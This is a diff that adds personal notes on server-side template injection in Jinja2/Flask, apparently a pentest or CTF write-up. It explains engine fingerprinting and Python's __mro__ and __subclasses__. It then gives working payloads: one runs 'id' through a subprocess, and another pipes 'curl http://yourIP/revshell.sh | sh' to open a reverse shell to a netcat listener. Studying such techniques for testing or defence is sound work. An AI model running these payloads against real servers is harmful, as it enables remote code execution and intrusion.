@@ -1,0 +1,78 @@
+Server-side template injection vulnerabilities arise when user input is concatenated
+into templates rather than being passed in as data.
+Static templates that simply provide placeholders into which dynamic content is
+rendered are generally not vulnerable to server-side template injection. 
+
+
+Once you have detected the template injection potential, the next step is to identify the template engine
+
+You should be aware that the same payload can sometimes return a successful response in more than one template language.
+For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2. Therefore, it is important not to jump to
+conclusions based on a single successful response.
+
+
+
+The MRO in __mro__ stands for Method Resolution Order, and is defined here as
+ “a tuple of classes that are considered when looking for base classes during method resolution.”
+
+ The __mro__ attribute consists of the object’s inheritance map in a tuple consisting of the class,
+ its base, its base’s base, and so on up to object (if using new-style classes). It is an attribute
+ of each object’s metaclass, but is a truly hidden attribute, as Python explicitely leaves it out
+ of dir output (see Objects/object.c at line 1812) when conducting introspection.
+
+The __subclasses__ attribute is defined here as a method that “keeps a list of weak references to
+its immediate subclasses.” for each new-style class, and “returns a list of all those references still alive.”
+
+Simplified, __mro__ allows us to go back up the tree of inherited objects in the current Python environment,
+and __subclasses__ lets us come back down
+
+
+
+{{ ''.__class__.__mro__ }}
+This is an empty string (two single quotes), and we are calling the __mro__ attribute of the class
+which the string type belongs to
+
+
+To start with, just to verify that this was actually going to get results, ran the ‘id’ command:
+{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate() }}
+
+
+With a netcat listener open, ran this code:
+{{ ''.__class__.__mro__[1].__subclasses__()[407]('curl http://yourIP/revshell.sh | sh', shell=True, stdout=-1).communicate() }}
+
+
+
+EXPLOITATION
+There are a few things to consider here. The Python environment will consist of:
+
+1. Things native to all Flask applications.
+2. Things custom to the target application.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
